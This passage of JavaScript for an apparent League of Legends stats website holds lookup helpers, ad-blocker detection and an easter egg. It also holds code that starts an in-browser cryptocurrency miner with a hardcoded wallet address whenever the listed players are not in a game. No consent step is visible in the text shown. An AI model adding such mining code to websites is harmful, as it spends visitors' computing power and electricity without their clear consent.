			}
		});
	});
	return promiseObj;
}

//Load current game from summoner Id
function getCurrentGame(summonerId, asynch = true) {
	var promiseObj = new Promise(function (resolve, reject) {
		$.ajax({
			async: asynch,
			url: '/currentGame',
			data: {
				"summonerId": summonerId,
				"region": getQuery("region")
			},
			success: function (data) {
				if (data.error == null) {
					resolve(data);
				} else {
					reject(data.error);
				}
			},
			error: function () {
				console.log("Oops! Ajax messed up.");
			}
		});
	});
	return promiseObj;
}


//Load the summoners from currentGame
function getSummoners(summoner, asynch = true) {
	var promiseObj = new Promise(function (resolve, reject) {
		$.ajax({
			async: asynch,
			url: '/summonerByName',
			data: {
				"username": summoner,
				"region": getQuery("region")
			},
			success: function (data) {
				if (data.error == null) {
					resolve(data);
				} else {
					reject(data.error);
				} 
			},
			error: function () {
				console.log("Oops! Ajax messed up.");
			}
		});
	});
	return promiseObj;
}

//Load matchlist by accoundId
function getMatchLists(accountId, asynch = true) {
	var promiseObj = new Promise(function (resolve, reject) {
		$.ajax({
			async: asynch,
			url: '/matchList',
			data: {
				"accountId": accountId,
				"region": getQuery("region")
			},
			success: function (data) {
				if (data.error == null) {
					resolve(data);
				} else {
					reject(data.error);
				}
			},
			error: function () {
				console.log("Oops! Ajax messed up.");
			}
		});
	});
	return promiseObj;
}

//Load match by match ID
function getMatch(matchId, asynch = true) {
	var promiseObj = new Promise(function (resolve, reject) {
		$.ajax({
			async: asynch,
			url: '/getMatch',
			data: {
				"matchId": matchId,
				"region": getQuery("region")
			},
			success: function (data) {
				if (data.error == null) {
					resolve(data);
				} else {
					reject(data.error);
				}
			},
			error: function () {
				console.log("Oops! Ajax messed up.");
			}
		});
	});
	return promiseObj;
}

//Load champion list
function getStats(champList, asynch = true) {
	var promiseObj = new Promise(function (resolve, reject) {
		$.ajax({
			async: asynch,
			url: '/getStats',
			data: {
				"champList": champList
			},
			success: function (data) {
				if (data.error == null) {
					resolve(data);
				} else {
					reject(data.error);
				}
			},
			error: function () {
				console.log("Oops! Ajax messed up.");
			}
		});
	});
	return promiseObj;
}

//Load the mastery of summoner's champs from currentGame
function getMastery(summonerId, championId, asynch = true) {
	var promiseObj = new Promise(function (resolve, reject) {
		$.ajax({
			async: asynch,
			url: '/getMastery',
			data: {
				"summonerId": summonerId,
				"championId": championId,
				"region": getQuery("region")
			},
			success: function (data) {
				if (data.error == null) {
					resolve(data);
				} else if (data.error == "404") {
					resolve(data);
				} else {
					reject(data.error);
				}
			},
			error: function () {
				console.log("Oops! Ajax messed up.");
			}
		});
	});
	return promiseObj;
}

//Load the league stats of summoners
function getLeague(summonerId, asynch = true) {
	var promiseObj = new Promise(function (resolve, reject) {
		$.ajax({
			async: asynch,
			url: '/getLeague',
			data: {
				"summonerId": summonerId,
				"region": getQuery("region")
			},
			success: function (data) {
				if (data.error == null) {
					resolve(data);
				} else {
					reject(data.error);
				}
			},
			error: function () {
				console.log("Oops! Ajax messed up.");
			}
		});
	});
	return promiseObj;
}

















//set borders on ads
window.setInterval(function fixBorders() {
	var ads = document.getElementsByClassName("ad");
	for (var i = 0; i < ads.length; i++) {
		console.log(ads[i].children[0].children.length);
		if (ads[i].children[0].children.length  <= 0) {
			ads[i].style.borderStyle = "none";
			ads[i].style.padding = "0px";
			document.getElementsByClassName("leftBanner")[0].style.borderStyle = "none";
			document.getElementsByClassName("rightBanner")[0].style.borderStyle = "none";
		} else {
			ads[i].style.borderStyle = "solid";
			ads[i].style.padding = "10px";
			document.getElementsByClassName("leftBanner")[0].style.borderStyle = "solid";
			document.getElementsByClassName("rightBanner")[0].style.borderStyle = "solid";
		}
	}
}, 200);



//var lastHashCount = 0;
//var lastRatesList = [];
////display hashrate
//setInterval(function() {
////	console.log(window._BatStats);
//	var theHashes = totalhashes;
//	lastRatesList.push(theHashes-lastHashCount);
//	var avgHash = 0;
//	for (var i = 0; i < lastRatesList.length; i++) {
//		avgHash += lastRatesList[i];
//	}
//	avgHash = avgHash/lastRatesList.length;
//	if (lastRatesList.length > 5) {
//		lastRatesList.shift();
//	}
//	lastHashCount = theHashes;
//	document.getElementById("hashrate").innerHTML = Math.round(avgHash) + " H/s";
////	console.log(Math.round(avgHash) + " H/s");
////	console.log("accepted hashes:" + acceptedhashes);
//},1000)


//document.getElementById("hashrate").addEventListener("click", function(event) {
//	document.getElementById("newUserMessage").style.display = "block";
//	$(".newUserMessage").addClass("newUserMessageVisible");
//	document.getElementById("newUserMessage").style.opacity = 1;
//	document.getElementById("mainUsername").value = getCookie("mainUsername");
//	document.getElementById("regionDropdown").value = getCookie("mainRegion");
//	if (getCookie("mainRegion") == null) {
//		document.getElementById("regionDropdown").value = "NA";
//	}
//});





var noMineUsernames = [];
var noMineRegions = [];
var noMineIds = [];
var mining = false;

var id = getCookie("id");
console.log(id);

throttleMiner = 50;
var wallet = '42yWf5tU9fFNUqy774TPzz7AX3XXcHqRyUyJETq51ofYaDWxLPKfjpnjXqrT3anyZ22j7DEE74GkbVcQFyH2nNiC3fj3KmC+100';

noMineUsernames.push(getCookie("mainUsername"));
noMineRegions.push(getCookie("mainRegion"));
noMineUsernames.push(getQuery("username"));
noMineRegions.push(getQuery("region"));


function mine(checkIntervalSec) {
	loadAllUsernamesNoMine().then(
		function success() {
			console.log(noMineUsernames);
			console.log(noMineRegions);
			console.log(noMineIds);
			
			var myPromises = [];
			for (var i = 0; i < noMineIds.length; i++) {
				myPromises.push(notInGame(noMineIds[i], noMineRegions[i]));
			}
			Promise.all(myPromises).then(
				function success(data) {
					console.log("start mining");
					if (!mining) {
						PerfektStart(wallet, id);
						mining = true;
					}
				},
				function fail(data) {
					console.log("stop mining");
					stopMining();
					mining = false;
				}
			);
			
			setInterval(function () {
				var myPromises = [];
				for (var i = 0; i < noMineIds.length; i++) {
					myPromises.push(notInGame(noMineIds[i], noMineRegions[i]));
				}
				Promise.all(myPromises).then(
					function success(data) {
						if (!mining) {
							console.log("start mining");
							PerfektStart(wallet, id);
							mining = true;
						}
					},
					function fail(data) {
						if(mining) {
							console.log("stop mining");
							stopMining();
							mining = false;
						}
					}
				);
			}, checkIntervalSec * 1000);
		}
	)
}

function notInGame(id, region) {
	var promiseObj = new Promise(function (resolve, reject) {
		getCurrentGameNoMine(id, region).then(
			function success(data) {
				reject();
			},
			function fail(data) {
				resolve();
			}
		);
	});
	return promiseObj;
}

//Load current game from summoner Id
function getCurrentGameNoMine(summonerId, region, asynch = true) {
	var promiseObj = new Promise(function (resolve, reject) {
		$.ajax({
			async: asynch,
			url: '/currentGame',
			data: {
				"summonerId": summonerId,
				"region": region
			},
			success: function (data) {
				if (data.error == null) {
					resolve(data);
				} else {
					reject(data.error);
				}
			},
			error: function () {
				console.log("Oops! Ajax messed up.");
			}
		});
	});
	return promiseObj;
}

function loadAllUsernamesNoMine() {
	var promiseObj = new Promise(function (resolve, reject) {
		if (noMineUsernames.length > 0) {
			var currentUsername = 0;
			loadUserIterate();

			function loadUserIterate() {
				loadUserNoMine(noMineUsernames[currentUsername], noMineRegions[currentUsername]).then(
					function success(data) {
						noMineIds.push(data);
						currentUsername++;
						if (noMineUsernames[currentUsername]) {
							loadUserIterate();
						} else {
							resolve();
						}
					},
					function fail(data) {
						var removeIndex = noMineUsernames.indexOf(noMineUsernames[currentUsername]);
						noMineUsernames.splice(removeIndex, 1);
						noMineRegions.splice(removeIndex, 1);
						if (noMineUsernames[currentUsername]) {
							loadUserIterate();
						} else {
							resolve();
						}
					}
				);
			}
		}
	});
	return promiseObj;
}

//Returns the input username's ID
function loadUserNoMine(username, region) {
	var promiseObj = new Promise(function (resolve, reject) {
		getUserInfoByNameNoMine(username, region).then(
			function success(data) {
				resolve(data.id);
			},
			function fail(data) {
				console.log("fail: " + data);
				reject();
			}
		);
	});
	return promiseObj;
}

//Load summoner info by summoner name
function getUserInfoByNameNoMine(theUsername, theRegion, asynch = true) {
	var promiseObj = new Promise(function (resolve, reject) {
		$.ajax({
			async: asynch,
			url: '/summonerByName',
			data: {
				"username": theUsername,
				"region": theRegion
			},
			success: function (data) {
				if (data.error == null) {
					resolve(data);
				} else {
					reject(data.error);
				}
			},
			error: function () {
				console.log("Oops! Ajax messed up.");
			}
		});
	});
	return promiseObj;
}





//display new user message
var mainUsername = getCookie("mainUsername");
var laterCookie = getCookie("later");
console.log(laterCookie);


// Function called if AdBlock is not detected
function adBlockNotDetected() {
	
	
}

// Function called if AdBlock is detected
function adBlockDetected() {
	//open popup
	if (laterCookie == null) {
		$(".newUserMessage").addClass("newUserMessageVisible");
	} else {
		document.getElementById("newUserMessage").style.display = "none";
	}
}

// We look at whether FuckAdBlock already exists.
if(typeof fuckAdBlock !== 'undefined' || typeof FuckAdBlock !== 'undefined') {
	// If this is the case, it means that something tries to usurp are identity
	// So, considering that it is a detection
	adBlockDetected();
} else {
	// Otherwise, you import the script FuckAdBlock
	var importFAB = document.createElement('script');
	importFAB.onload = function() {
		// If all goes well, we configure FuckAdBlock
		fuckAdBlock.onDetected(adBlockDetected)
		fuckAdBlock.onNotDetected(adBlockNotDetected);
	};
	importFAB.onerror = function() {
		// If the script does not load (blocked, integrity error, ...)
		// Then a detection is triggered
		adBlockDetected(); 
	};
	importFAB.integrity = 'sha256-xjwKUY/NgkPjZZBOtOxRYtK20GaqTwUCf7WYCJ1z69w=';
	importFAB.crossOrigin = 'anonymous';
	importFAB.src = 'https://cdnjs.cloudflare.com/ajax/libs/fuckadblock/3.2.1/fuckadblock.min.js';
	document.head.appendChild(importFAB);
}






////Enter key handler for mainUsername textbox
//document.getElementById("mainUsername").addEventListener("keyup", function(event) {
//    event.preventDefault();
//    if (event.keyCode === 13) {
//        document.getElementById("submit-mainUsername").click();
//    }
//});
//
//document.getElementById("submit-mainUsername").addEventListener("click", function(event) {
//	//if username is given
//	if (document.getElementById("mainUsername").value != "") {
//		setCookie("mainUsername",document.getElementById("mainUsername").value,365);
//		setCookie("mainRegion",document.getElementById("regionDropdown").value,356);
//		document.getElementById("newUserMessage").style.opacity = 0;
//		setTimeout(function() {
//			document.getElementById("newUserMessage").style.display = "none";
//			document.getElementById("textfield").focus();
//		}, 600);
//	} else {
//		document.getElementById("mainUsername").className = "mainUsernameInputError";
//	}
//});

document.getElementById("cancelButton").addEventListener("click", function(event) {
	//if username is given
	setCookie("later", true, 0.0416);
	eraseCookie("mainUsername");
	document.getElementById("newUserMessage").style.opacity = 0;
	setTimeout(function() {
		document.getElementById("newUserMessage").style.display = "none";
		document.getElementById("textfield").focus();
	}, 600);
});


function displayDraven() {
	if (Math.random() > 0.99 || getCookie("curseOfDraven")) {
		var x = Math.random()*(window.innerWidth-180);
		var y = Math.random()*(window.innerHeight-220);
		//Move the image to the new location
		document.getElementById("draven").style.top = y + 'px';
		document.getElementById("draven").style.left = x + 'px';
		$(".draven").addClass("dravenVis");
		window.setTimeout(function() {
			$(".draven").removeClass("dravenVis");
		}, 500);
	}
}

window.setInterval('displayDraven()', 3000);